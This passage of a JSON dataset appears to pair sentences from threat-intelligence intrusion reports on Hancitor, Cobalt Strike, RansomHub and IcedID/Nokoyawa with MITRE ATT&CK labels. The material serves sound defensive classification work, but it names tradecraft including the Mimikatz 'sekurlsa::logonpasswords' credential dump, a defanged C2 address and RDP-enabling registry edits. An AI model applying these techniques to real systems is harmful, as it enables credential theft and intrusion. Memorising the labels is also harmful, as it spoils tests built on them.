    "text": "After about 20 minutes, the threat actor copied a batch script file and DLL file to another system using the SMB protocol.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A remote service was installed to start the batch file, which executed the Cobalt Strike shellcode-embedded DLL.",
    "command": "",
    "labels": [
      "T1055",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "On the second compromised system, various discovery-related commands were executed before going silent.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Hancitor malware was embedded in a macro-based Word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This single-paged document contained a picture with instructions, attempting to lure the victim into enabling macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the macro we can see that in sub yyy (towards the bottom) content within the document is being copied and used to create a file object by sub xxx which then is executed by the shell call to rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The malicious Hancitor DLL in the OLE object, named “rem.r”, was executed via rundll32.exe by passing the entry point “ESLMJYVFM”.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The code was injected into multiple instances of svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Memory analysis also shows suspicious memory protections (page_execute_readwrite) and regions of the particular process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, when looking at the process tree, we can identify the unusual parent-child process relationship of rundll32.exe starting svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "One of the injected rundll32.exe instance was also observed connecting to the Cobalt Strike C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The DLL contains the Cobalt Strike shellcode and will only execute if the “11985756” parameter is passed to the TstSec function.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "After extracting the Cobalt Strike shellcode from 95.dll and emulating it via scdbg, we found that it’s connecting to 162.244.83[.]95 over port 8080.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Since 95.dll was executed by rundll32.exe, and from the host logs, it is evident that rundll32.exe connected to 162.244.83[.]95 over port 8080.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Packet analysis to the IP address mentioned above, shows that it’s downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once downloaded, the stager allocates a new memory region inside the current rundll32.exe process and loads it into the memory and starts the C2 activity.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The injected svchost process dropped two files: a batch-file named: “95.bat” and a DLL-file named: “95.dll”.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The content of the batch file can be seen below–it executes the transferred DLL and then deletes itself:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "To execute the batch file, the threat actor installed, and started, a remote service on the other system.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "An attempt to open lsass.exe process was observed on the system where lateral movement occurred but there were no signs of successful read attempts.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "First, the malware performed a lookup of the external IP-address of the infected system (1).",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by Hancitor C2 traffic, sent via HTTP POST requests, which included unique attributes of the infected system, such as hostname and username information (2).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Hancitor then attempted to download additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This included the info-stealer known as “Ficker Stealer” (4), for which the DNS traffic corresponds to a recent article posted by Brad.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Hancitor also attempted to download Cobalt Strike stagers (.bin files) (3), and Cobalt Strike traffic was sent both encrypted and unencrypted (5).",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Initial access was via a password spray attack against an exposed RDP server, targeting numerous accounts over a four-hour period.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Mimikatz and Nirsoft were used to harvest credentials, with evidence of LSASS memory access.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Discovery was accomplished using living-off-the-land binaries as well as Advanced IP Scanner and NetScan.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Rclone was used to exfiltrate data to a remote server using SFTP.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor deployed RansomHub ransomware network wide, which spread over SMB and was executed using remote services.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began in November 2024 with a password spray attack targeting an internet-facing RDP server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Several hours later they then logged in via RDP with one of the previously compromised users and ran a series of discovery commands, including various net commands to enumerate users and computers.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Credential access tools, specifically Mimikatz and Nirsoft CredentialsFileView, were used to extract stored credentials and interact with LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately two hours after initially authenticating to the beachhead host, the threat actor used RDP to move laterally to two domain controllers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once on the domain controllers, they accessed the Windows Administrative Tools via the graphical user interface (GUI) to examine the DNS management console.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Simultaneously, the threat actor continued to access additional servers and endpoints, conducting similar activities, namely reconnaissance via net commands and credential harvesting using Mimikatz throughout the environment.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During this same time frame, Advanced IP Scanner was downloaded via the Microsoft Edge browser, and a network scan was initiated from the beachhead host.",
    "command": "",
    "labels": [
      "T1016",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then continued lateral movement to additional hosts targeting backup servers, file servers, hypervisors, and more domain controllers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They utilized Mimikatz across several of these hosts outputting CSV files named for the child domains the hosts belonged to.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor concluded their operations for the day by viewing documents on various file shares after successfully gaining access to several high-value servers within the environment via RDP using their high-privileged account.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the second day, they returned to the beachhead and reran Advanced IP Scanner and also SoftPerfect NetScan for broader network mapping.",
    "command": "",
    "labels": [
      "T1016",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Later, Atera was installed via RDP on two backup servers, likely to maintain persistent remote access through legitimate administrative channels.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor continued with another round of discovery.",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "On the start of the third day they employed Rclone to exfiltrate files over SFTP.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the fifth day the threat actor returned via Splashtop installed on one of the backup servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From there they performed another network sweep using Netscan.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They then used RDP to connect to several hosts including domain controllers where several user passwords were reset.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A little over an hour after becoming active again, now on the sixth day of the intrusion, the threat actor connected to a new server, ran another round of Netscan and then prepared for their ransomware deployment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They dropped the binary named amd64.exe and executed it on the host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This started a chain where files on the local host were encrypted but it also reached out to remote hosts to transfer a copy of the ransomware over SMB and then execute that file on the hosts using a remote service.",
    "command": "",
    "labels": [
      "T1105",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Once ran, the ransomware tried to kill any running virtual machines, setup permissive symlinks, delete shadow copies, and clear event logs.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor’s first observed interaction with the victim environment occurred in late November 2024, when they initiated a series of password spraying attempts against multiple user accounts via a publicly accessible Remote Desktop Protocol (RDP) server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor successfully authenticated into six distinct user accounts, as evidenced by multiple instances of Windows Security Log Event ID 4624, indicating successful logons.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor selected a user and performed a login, about four hours after the successful logon occurrences from the password spray activities.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Digging deeper in to the login we observed that the Initial Access User logged in with Elevated Token (Elevated Token: Yes), which means the session this event represents is elevated and has administrator privileges – Event 4624 Microsoft Learn.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "nocmd.vbs was executed as part of the exfiltration process using RClone.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This Visual Basic script creates a WScript process that runs the RClone exfiltration batch script, rcl.bat.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "rcl.bat was a batch script used to execute a RClone job.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As part of the Ransomhub ransomware operation, numerous Windows shell commands were executed.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also executed common discovery commands such as nslookup , net and more.",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor leveraged their RDP session to interact directly with the desktop environment, as evidenced by the parent process explorer.exe launching tools and binaries like Mimikatz, CredentialsFileView, Advanced IP Scanner, and NetScan.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1016",
      "T1021.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the threat actor deployed Atera and Splashtop RMM tools on several hosts.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "These tools enabled persistence by setting up services on the hosts which can be observed in event ID 7045.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "At a later stage of the operation, the threat actor was observed changing multiple users passwords utilizing net command, to the same password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the threat actor did not clear all files they dropped, but they did pay special attention to specifically return to the file servers some 20 hours after exfiltration activity to remove the Rclone related files discussed in the Exfiltration section.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As we observe in most of our intrusions, once the threat actor gained access to the RDP-exposed beachhead host via password spraying, they leveraged well-known credential harvesting tools, specifically Mimikatz and Nirsoft’s CredentialsFileView.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the beachhead host, we observed both tools being dropped on the Desktop of the compromised user.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, Mimikatz was used to capture various sensitive information.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The execution patterns for these align with event ID 4662 logs for Active Directory sync events:\nThe number of logs do not indicate a full sync of all AD accounts, but likely the threat actor was checking to see if their privileged account existed across all domains and share the same password.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Further Sysmon log analysis suggests that Mimikatz was also likely run with commands targeting the Local Security Authority Subsystem Service (LSASS) process, such as when the command “sekurlsa::logonpasswords” was used, a command designed to extract credentials and tickets directly from LSASS memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "If the full command line is not available, another way to capture Mimikatz targeting LSASS is by looking for process accessing LSASS (Sysmon Event 10).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "They used built-in Windows commands such as net and nltest , third-party tools like Advanced IP Scanner and SoftPerfect’s NetScan, and Microsoft Management Console applets.",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Living-off-the-land discovery command sequence in the beachhead RDP server",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor utilized these commands to perform discovery of the victim network:",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Nslookup – Resolve internal domain name to identify domain controllers or DNS info",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Ipconfig – Retrieve detailed network interface configuration to learn about the local host’s IP settings, DNS, and gateway",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Route – Display routing table to analyze reachable networks and plan pivoting or data exfiltration paths",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Ping – Test connectivity and resolve internal hostnames to identify active and reachable systems within the network",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Whenever the threat actor successfully logged in into a new endpoint, they performed the combinations of above commands over and over again.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Living-off-the-land discovery command sequence on other hosts and servers",
    "command": "",
    "labels": [
      "T1016",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor downloaded the Advanced IP Scanner from the official website, this can be observed from the Zeek/Suricata logs, specifically with the rule “ET ADWARE_PUP IP Scanner Tool Update Request (GET)”",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The installer was saved in the domain admin account’s Downloads folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor executed the Advanced IP Scanner in 3 different occasions.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor dropped netscan.exe in the Initial Access User’s desktop folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After gaining access to the Domain Admin account, they also dropped the binary in desktop folders on multiple hosts and servers, notably a backup server, share server, hypervisor server and workstations.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "From Sysmon event ID 1, we can see the execution of the NetScan tool.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "We can see it as Sysmon event ID 11 – File Creation in the destination (target) host or Sysmon event ID 1 – Process Creation via rundll32.exe C:\\Windows\\system32\\davclnt.dll,DavSetCookie commands in the source host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sysmon event ID 1 – Process Creation in the source host",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Initial lateral movement within the victim network was achieved through the use of the Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of security event logs across multiple compromised hosts revealed successful RDP attempts originating from internal systems, including the beachhead host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "These attempts can be observed when looking at Security event ID 4624, with a LogonType 10, as shown below.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "On day six of the intrusion, the threat actor started preparing for the automated deployment of the ransomware payload throughout the network.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After the initial execution of the ransomware binary on a system, the spawned process began establishing connections with other internal systems.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These network communications involved the transfer of the ransomware binary to remote hosts using the Server Message Block (SMB) protocol.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Network analysis revealed evidence of SMB operations with random filenames, all having the same size, as observed below from Zeek.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the threat actor was observed deploying Atera with Splashtop, a legitimate RMM tool.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This activity allowed them to blend in with normal network activity utilizing Atera’s built-in features for remote access, as Atera integrates with several remote agent tools.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Splashtop leaves logs in the agent_log.txt file located in the C:/Program Files (x86)/Splashtop/Splashtop Remote/Server/log/ folder, as indicated in the public LOLRMM website.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Threat Actor Hostname and Display Name Identification via SPLog.txt",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition to identifying the usage of Splashtop through agent_log.txt, further evidence was obtained from the SPLog.txt file, which logs client-specific details when a remote session is initialized.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Security Event Logs (e.g., Event ID 4624 with matching host/user as seen below)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Registry entries related to Splashtop or RMM installations",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Endpoint detection logs or memory forensics",
    "command": "",
    "labels": [
      "T1005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Correlation from this log and Security Event ID 4624 event logs (especially logs with a loopback source IP address) can be used to confirm the remote access activity.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From day one and initial access, the threat actor was observed continuously using RDP to maintain access to the compromised environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They used it to establishing interactive sessions throughout which they could execute commands, move laterally and continue their malicious actions, even while having other means to maintain their access to the infrastructure.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Defenders should look for external IP login in their Security Event Logs, or by monitoring their networks, and filtering for the RDP protocol and port 3389.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Threat actor’s will also enable RDP access by modifying registry keys (hkey_local_machine\\software\\policies\\microsoft\\windows nt\\terminal services\\fdenytsconnections) and firewall settings​ allowing inbound RDP (port 3389).",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "While no Sysmon file create events were observed for the Rclone configuration file, it was able be seen from the MFT and NTFS artifacts that can be extracted from memory.",
    "command": "",
    "labels": [
      "T1005",
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The original ransomware executable was invoked directly via cmd.exe from a RDP session.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "For the remote hosts, the ransomware was executed via a remote service, with random 6-letters name as image name and service name.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This can be seen from event ID 7045 – Service Control Manager provider.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "We’ve previously reported on a Nokoyawa ransomware case in which the initial access was via an Excel macro and IcedID malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This threat actor delivered a password protected ZIP file via HTML smuggling to organizations back in late October, early November 2022.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Within the password protected ZIP file, there was an ISO file that deployed IcedID which led to the use of Cobalt Strike and ultimately Nokoyawa ransomware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This HTML file was using a technique known as HTML smuggling.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This is one of the techniques threat actors have pivoted to since macro control defaults were updated by Microsoft.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Just a month prior, this threat actor was observed using Excel macros in an extremely similar campaign.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon the user opening the HTML file, a fake Adobe page was presented and a ZIP file was downloaded.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Adobe lure includes a password for the ZIP as a way to protect the malicious contents from automated analysis.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Inside the ZIP was an ISO file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Inside the ISO was the malware payload.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The only visible file to the user was a LNK file masquerading as a document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the user clicked the LNK file, a series of commands were then executed.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "These included copying rundll32 and a malicious DLL from within the ISO to the host, before executing the malware.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After loading the malicious DLL, a connection was made to IcedID command and control servers.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the malicious DLL was executed, persistence was also established via a scheduled task on the beachhead host.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This task was set to run the IcedID malware every hour on the host.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Initial discovery commands were ran seconds after reaching out to the command and control server.",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "These commands have been seen in previous reports involving IcedID, including standard utilities like net, ipconfig, systeminfo, and nltest.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Around three hours after execution of the initial IcedID malware, a cmd process was spawned from IcedID.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This new process began beaconing to a Cobalt Strike server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This Cobalt Strike server was previously observed in a prior Nokoyawa report.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This process was then observed accessing LSASS, likely to access credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the Cobalt Strike beacon, the threat actor looked up specific domain administrators using the net utility.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using one of those accounts, the threat actor initiated a RDP session to move laterally to a domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Using this session, the threat actor copied over a Cobalt Strike beacon to the domain controller and executed it.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was followed by the threat actor running a second batch file, which iterated through the network performing a nslookup for each host in the environment.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then logged into additional hosts over RDP, including a backup server and a server with file shares.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor returned to the domain controller and utilized netscan to perform a network scan.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "At the same time, PsExec was used to execute the p.bat file starting the ransomware binary on the other hosts in the domain.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The ransomware affiliate is seen RDPing into the environment from server name WIN-5J00ETD85P5.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After execution, a legitimate image is opened to trick the user into thinking nothing is amiss.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The ISO file contained a LNK file, with an icon of an Image, which prompted the user to click on it.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "When the user opened the LNK file, the batch script demurest.cmd was executed.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "templates544.png was an IcedID DLL and was executed via entails.exe.",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "We can see from memory (MemProcFS), cmd executes entails.exe, which executes the IcedID dll by looking at the CommandLine.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Around six hours into the intrusion, 1.dll (Cobalt Strike) was dropped on the beachhead host before being copied to a domain controller.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "IcedID registered a scheduled task to gain persistence on the beachhead host, which ran every hour.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "We can also see similar information in memory by reviewing most recently created scheduled tasks:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "If we take that data blob, decode the contents with base64, and export that into a file, we can find the zipped ISO file hidden in the document:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The PK header indicates the data is the start of a zip file, and the following data reveals the contents to be an ISO file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Entails.exe, which loaded the IcedID DLL, was then observed injecting into a cmd.exe process on the beachhead host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Below we can see the IcedID loader in memory in the entails.exe process:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Scanning the process memory of cmd.exe, the YARA rule win_cobalt_strike_auto from Malpedia fired.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected cmd.exe, in turn, injected into rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It appears Cobalt Strike was used to access the LSASS memory space.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The access granted was 0x1010 & 0x1fffff.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These access patterns were also seen in previous reports here and here.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These values can be used to identify credential access.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "As a part of discovery commands, IcedID used WMI to get the list of Anti-Virus product installed on the beachhead host with the following command:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This file contained a list of hosts on the network to perform DNS lookups using nslookup.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor connected to various hosts in the network via RDP tunneled through the beacon process on the beachhead host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We can find the hostname of the threat actor present in some of the Windows logs, event ID’s 4624, 4776, 4778, and 4779.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The workstation name observed in a 4624 event on the beachhead:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Seen again in a 4776 event from a domain controller:",
    "command": "",
